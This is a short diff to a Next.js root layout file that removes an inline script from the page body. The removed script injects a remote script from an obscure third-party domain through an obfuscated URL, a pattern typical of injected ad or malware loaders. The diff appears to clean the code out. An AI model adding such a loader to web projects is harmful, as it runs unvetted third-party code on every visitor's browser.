@@ -34,18 +34,6 @@ export default function RootLayout({
       <body className={`${geistSans.variable} ${geistMono.variable} antialiased`} suppressHydrationWarning={true}>
         {children}
         <Toaster />
-        <script>
-(function(meahf){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = meahf || {};
-s.src = "\/\/informalcelebration.com\/ciD.9t6EbA2E5jlCSCWJQ\/9UNgjBMwwAMIz\/It4mN-S\/0\/2KM-zqAuz\/MRjcgK2r";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
       </body>
     </html>
   );
